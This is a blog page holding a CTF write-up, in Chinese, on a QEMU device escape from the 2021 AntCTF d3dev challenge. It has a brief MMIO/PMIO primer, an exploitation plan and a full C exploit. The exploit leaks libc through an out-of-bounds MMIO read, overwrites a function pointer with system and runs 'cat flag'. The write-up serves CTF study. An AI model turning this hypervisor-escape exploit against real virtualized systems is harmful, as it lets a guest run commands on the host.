@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/pikaqiu.ico?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="qemu 初探">
+<meta name="keywords" content="Qemu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QEMU 初探">
+<meta property="og:url" content="https://pwn.org.cn/2021/03/15/qemu/index.html">
+<meta property="og:site_name" content="Cooook&#39;s Blog">
+<meta property="og:description" content="qemu 初探">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2022-10-22T11:16:45.848Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="QEMU 初探">
+<meta name="twitter:description" content="qemu 初探">
+  <link rel="canonical" href="https://pwn.org.cn/2021/03/15/qemu/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>QEMU 初探 | Cooook's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cooook's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">不管是怎样的回忆，都是我们活过的人生。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-links">
+      
+    
+
+    <a href="/links/" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>links</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://pwn.org.cn/2021/03/15/qemu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cooook">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/10/03/67Hi83ZnSBGKkRf.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cooook's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">QEMU 初探
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2021-03-15 10:28:18" itemprop="dateCreated datePublished" datetime="2021-03-15T10:28:18+08:00">2021-03-15</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-10-22 19:16:45" itemprop="dateModified" datetime="2022-10-22T19:16:45+08:00">2022-10-22</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>qemu 初探<br><a id="more"></a></p>
+<h1 id="0x0-qemu"><a href="#0x0-qemu" class="headerlink" title="0x0 qemu"></a>0x0 qemu</h1><p>通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。<br>通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，这种情况下CPU需要使用专门的I/O指令如IN/OUT访问I/O端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure></p>
+<p>xx:yy:z的格式为总线：设备：功能的格式。</p>
+<h1 id="0x1-2021-AntCtf-d3dev"><a href="#0x1-2021-AntCtf-d3dev" class="headerlink" title="0x1 2021 AntCtf d3dev"></a>0x1 2021 AntCtf d3dev</h1><h2 id="设备分析"><a href="#设备分析" class="headerlink" title="设备分析"></a>设备分析</h2><p>首先可以通过d3dev_class_init来判断它是哪个设备.<br>然后可以在./launch.sh 中查看应该是d3dev这个设备出了问题, 但是这个d3devState结构体是不会默认导入的.<br>需要在ida中导入. 在IDA-&gt;views-&gt;subview-&gt;localtype里搜索 d3 可以找到这个设备结构体，用了这个结构体以后代码就好看很多了。  </p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>参看<a href="https://wood1314.github.io/year/03/07/cklza4rdw0032alu5j400mlx1/#more" target="_blank" rel="noopener">wood1314</a>  </p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用block的越界读读出rand_r的libc地址.<br>然后修改rand_r对应的函数指针为system.<br>将r_seed和后面的block写入命令.<br>利用pmio_write调用rand_r  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要注意这里需要将key清零, 在加密解密的时候会容易一血</span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc040</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *message)</span> </span>&#123;</span><br><span class="line">    perror(message);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> x, <span class="keyword">uint64_t</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        x += (i + y) ^ (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)y &gt;&gt; <span class="number">5</span>)) ^ (y &lt;&lt; <span class="number">4</span>);</span><br><span class="line">        y = (<span class="keyword">uint32_t</span>)(((i + x) ^ ((x &gt;&gt; <span class="number">5</span>)) ^ (  x &lt;&lt; <span class="number">4</span>)) + y);</span><br><span class="line">    &#125; <span class="keyword">while</span> (i != <span class="number">0xC6EF3720</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"x = %p, y = %p , i = %p\n"</span>,x,y,i);</span><br><span class="line">    <span class="keyword">uint64_t</span> ans = (y &lt;&lt; <span class="number">32</span>) + x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ans = %p\n"</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> ans - <span class="number">0x4AEB0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint64_t</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v4 = x;</span><br><span class="line">    <span class="keyword">uint64_t</span> result = x &gt;&gt; <span class="number">32</span>; </span><br><span class="line">    <span class="keyword">uint32_t</span> addr = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        result = (<span class="keyword">uint32_t</span>)(result - ((v4 + addr) ^ (v4 &gt;&gt; <span class="number">5</span>) ^ (v4 &lt;&lt; <span class="number">4</span>)));</span><br><span class="line">        v4 -= (result + addr) ^ (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (<span class="number">16</span> * result);</span><br><span class="line">        addr += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(addr) ;</span><br><span class="line">    <span class="keyword">return</span> result &lt;&lt; <span class="number">32</span> | v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> val)</span> </span>&#123;</span><br><span class="line">    outl(val, addr); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(addr); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> val)</span> </span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_seek</span><span class="params">(<span class="keyword">int</span> seek)</span> </span>&#123;</span><br><span class="line">    pmio_write(pmio_base + <span class="number">8</span>, seek); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset_keys</span><span class="params">()</span></span>&#123;</span><br><span class="line">    pmio_write(pmio_base + <span class="number">4</span>, <span class="number">0</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> tmp, tmp1, tmp2; </span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmio_fd mmap failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mmio_read(24); </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>) </span><br><span class="line">        die(<span class="string">"port permission is not enough"</span>);</span><br><span class="line"></span><br><span class="line">    reset_keys();</span><br><span class="line">    set_seek(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> x;</span><br><span class="line">    <span class="keyword">uint64_t</span> y, libc_base;</span><br><span class="line">    x = mmio_read(<span class="number">24</span>);</span><br><span class="line">    y = mmio_read(<span class="number">24</span>);</span><br><span class="line">    libc_base = decrypt(x, y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"libc_base = %p\n"</span>, libc_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system = libc_base + <span class="number">0x0000000000055410</span>;</span><br><span class="line">    mmio_write(<span class="number">24</span>, (<span class="keyword">uint32_t</span>)(encrypt(system)));</span><br><span class="line">    mmio_write(<span class="number">24</span>, (<span class="keyword">uint32_t</span>)(encrypt(system) &gt;&gt; <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> flag1 = <span class="number">0x20746163</span>; <span class="comment">//"cat "</span></span><br><span class="line">    <span class="keyword">uint64_t</span> flag2 = <span class="number">0x67616c66</span>; <span class="comment">// "flag"</span></span><br><span class="line"></span><br><span class="line">    set_seek(<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, (<span class="keyword">uint32_t</span>)(encrypt(flag2)));</span><br><span class="line">    mmio_write(<span class="number">0</span>, (<span class="keyword">uint32_t</span>)(encrypt(flag2) &gt;&gt; <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">28</span> + pmio_base,flag1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/Qemu/" rel="tag"># Qemu</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2021/02/16/FSOP/" rel="next" title="FSOP">
+                  <i class="fa fa-chevron-left"></i> FSOP
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2021/05/12/MITlab/" rel="prev" title="MIT lab记录">
+                  MIT lab记录 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-qemu"><span class="nav-number">1.</span> <span class="nav-text">0x0 qemu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-2021-AntCtf-d3dev"><span class="nav-number">2.</span> <span class="nav-text">0x1 2021 AntCtf d3dev</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#设备分析"><span class="nav-number">2.1.</span> <span class="nav-text">设备分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路"><span class="nav-number">2.3.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">2.4.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="https://i.loli.net/2019/10/03/67Hi83ZnSBGKkRf.jpg"
+      alt="Cooook">
+  <p class="site-author-name" itemprop="name">Cooook</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cooook</span>
+</div>
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
